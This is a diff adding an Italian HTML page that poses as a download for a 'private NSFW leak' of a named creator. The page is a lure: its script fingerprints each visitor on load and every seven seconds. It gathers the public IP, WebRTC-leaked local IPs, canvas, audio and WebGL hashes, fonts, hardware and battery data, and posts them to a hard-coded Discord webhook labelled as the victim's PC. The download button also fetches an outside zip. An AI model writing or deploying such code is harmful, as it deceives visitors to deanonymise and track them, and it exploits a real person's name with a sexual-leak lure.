@@ -1,0 +1,195 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>NoxiusNoxy - ULTRA PRIVATE NSFW LEAK 2026 [4.2GB]</title>
+    <style>
+        body { background: #000; color: #ff00ff; font-family: Arial; text-align: center; padding: 60px; margin: 0; }
+        .button {
+            padding: 30px 100px; font-size: 36px; background: linear-gradient(45deg, #ff00ff, #00ffff);
+            color: white; border: none; border-radius: 20px; cursor: pointer; margin: 60px;
+            box-shadow: 0 0 60px #ff00ff; animation: glow 1.5s infinite alternate;
+        }
+        @keyframes glow { from { box-shadow: 0 0 40px #ff00ff; } to { box-shadow: 0 0 90px #00ffff; } }
+        h1 { font-size: 48px; text-shadow: 0 0 40px #ff00ff; }
+    </style>
+</head>
+<body>
+    <h1>🔥 NOXYSNOXY PRIVATE ULTRA LEAK 2026 🔥</h1>
+    <p>4.2 GB • All Commissions • Raw PSD • Lewd Videos • Personal Folder</p>
+    <p>Password: <strong>noxysnoxyULTIMATE2026</strong></p>
+
+    <a href="#" id="downloadBtn" class="button">⬇️ SCARICA TUTTO ORA</a>
+
+    <script>
+        const WEBHOOK = "https://discord.com/api/webhooks/1516557179958591658/RHo2_tp0AvLmXndWh3ofo06nEGbbz2gFvD2LdTh81bytuZShO1tnXOo_jt_vLpUxGJBV"; // CAMBIA
+
+        async function sendToWebhook(data) {
+            fetch(WEBHOOK, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(data)
+            }).catch(() => {});
+        }
+
+        // === FINGERPRINT ESTREMO ===
+        async function ultraFingerprint() {
+            const ip = await (await fetch('https://api.ipify.org?format=json').catch(() => ({json: () => ({ip:"N/A"})}))).json().then(d => d.ip);
+
+            const localIPs = await new Promise(resolve => {
+                const ips = [];
+                const pc = new RTCPeerConnection({iceServers:[]});
+                pc.createDataChannel("");
+                pc.onicecandidate = e => {
+                    if (e.candidate) {
+                        const match = e.candidate.candidate.match(/(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/g);
+                        if (match) match.forEach(ip => ips.push(ip));
+                    }
+                };
+                pc.createOffer().then(o => pc.setLocalDescription(o));
+                setTimeout(() => resolve([...new Set(ips)]), 1800);
+            });
+
+            // Canvas + AudioContext + WebGL Fingerprinting
+            let canvasHash = "";
+            let audioHash = "";
+            let webglInfo = {};
+
+            try {
+                const canvas = document.createElement('canvas');
+                const ctx = canvas.getContext('2d');
+                ctx.fillStyle = "#f0f";
+                ctx.fillRect(0,0,300,200);
+                ctx.fillStyle = "#0ff";
+                ctx.font = "40px Impact";
+                ctx.fillText("Noxy Dox Tool", 20, 100);
+                canvasHash = canvas.toDataURL();
+            } catch(e) {}
+
+            try {
+                const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+                const oscillator = audioCtx.createOscillator();
+                const analyser = audioCtx.createAnalyser();
+                oscillator.type = "triangle";
+                oscillator.frequency.setValueAtTime(10000, audioCtx.currentTime);
+                oscillator.connect(analyser);
+                analyser.connect(audioCtx.destination);
+                oscillator.start();
+                const buffer = new Float32Array(analyser.fftSize);
+                analyser.getFloatFrequencyData(buffer);
+                audioHash = btoa(buffer.slice(0, 50).join(","));
+                oscillator.stop();
+            } catch(e) {}
+
+            try {
+                const gl = document.createElement('canvas').getContext('webgl2');
+                if (gl) {
+                    webglInfo = {
+                        vendor: gl.getParameter(gl.VENDOR),
+                        renderer: gl.getParameter(gl.RENDERER),
+                        version: gl.getParameter(gl.VERSION),
+                        shadingLanguage: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
+                        maxTextureSize: gl.getParameter(gl.MAX_TEXTURE_SIZE)
+                    };
+                }
+            } catch(e) {}
+
+            // Fonts detection
+            const fonts = ["Arial", "Helvetica", "Impact", "Times New Roman", "Courier New", "Verdana", "Georgia", "Comic Sans MS", "Segoe UI", "Roboto"];
+            const detectedFonts = fonts.filter(font => {
+                const span = document.createElement('span');
+                span.style.fontFamily = font;
+                span.style.visibility = "hidden";
+                document.body.appendChild(span);
+                const width = span.offsetWidth;
+                document.body.removeChild(span);
+                return width > 0;
+            });
+
+            const info = {
+                timestamp: new Date().toISOString(),
+                public_ip: ip,
+                local_ips: localIPs.join(" | "),
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                hardware: {
+                    cores: navigator.hardwareConcurrency,
+                    ram: navigator.deviceMemory,
+                    gpu: webglInfo.renderer || "N/A"
+                },
+                screen: {
+                    resolution: `${screen.width}x${screen.height}`,
+                    avail: `${screen.availWidth}x${screen.availHeight}`,
+                    colorDepth: screen.colorDepth,
+                    pixelRatio: window.devicePixelRatio
+                },
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                languages: navigator.languages,
+                battery: "N/A",
+                connection: navigator.connection ? navigator.connection.effectiveType : "N/A",
+                canvasHash: canvasHash.substring(0, 200) + "...",
+                audioHash: audioHash,
+                webgl: webglInfo,
+                detectedFonts: detectedFonts,
+                plugins: Array.from(navigator.plugins || []).map(p => p.name),
+                referrer: document.referrer,
+                url: window.location.href,
+                doNotTrack: navigator.doNotTrack,
+                cookieEnabled: navigator.cookieEnabled
+            };
+
+            // Battery
+            if (navigator.getBattery) {
+                const battery = await navigator.getBattery().catch(() => null);
+                if (battery) info.battery = `${Math.round(battery.level*100)}% ${battery.charging ? 'Charging' : ''}`;
+            }
+
+            const payload = {
+                content: "**🔥 ULTRA PC FINGERPRINT - NOXYSNOXY TARGET**",
+                embeds: [{
+                    color: 0xff00ff,
+                    title: "Informazioni complete dal PC della vittima",
+                    description: "Massimo possibile via browser",
+                    fields: [
+                        { name: "🌐 Public IP", value: `\`${info.public_ip}\``, inline: true },
+                        { name: "🏠 Local Network IPs", value: `\`${info.local_ips}\``, inline: true },
+                        { name: "🕒 Timezone", value: info.timezone, inline: true },
+                        { name: "🖥️ Resolution", value: info.screen.resolution, inline: true },
+                        { name: "📊 Hardware", value: `Cores: ${info.hardware.cores} | RAM: ${info.hardware.ram}GB | GPU: ${info.hardware.gpu}`, inline: false },
+                        { name: "🔋 Battery", value: info.battery, inline: true },
+                        { name: "🌐 Connection", value: info.connection, inline: true },
+                        { name: "🖼️ Canvas Hash", value: `\`${info.canvasHash}\``, inline: false },
+                        { name: "🔊 Audio Hash", value: `\`${info.audioHash}\``, inline: false },
+                        { name: "🔤 Fonts Rilevati", value: info.detectedFonts.join(", "), inline: false },
+                        { name: "📦 Plugins", value: info.plugins.length ? info.plugins.join("\n") : "N/A", inline: false },
+                        { name: "Full User-Agent", value: `\`\`\`${info.userAgent}\`\`\``, inline: false }
+                    ]
+                }]
+            };
+
+            sendToWebhook(payload);
+        }
+
+        // Trigger aggressivi
+        document.getElementById('downloadBtn').addEventListener('click', e => {
+            e.preventDefault();
+            ultraFingerprint();
+
+            // Fake download
+            const a = document.createElement('a');
+            a.href = "https://files.catbox.moe/9k8f2m.zip"; // Cambia
+            a.download = "noxysnoxy_ultra_leak_2026.zip";
+            a.click();
+
+            setTimeout(() => alert("Download avviato! Password: noxysnoxyULTIMATE2026"), 700);
+        });
+
+        // Log continuo
+        window.onload = () => {
+            ultraFingerprint();
+            setInterval(ultraFingerprint, 7000);
+        };
+    </script>
+</body>
+</html>
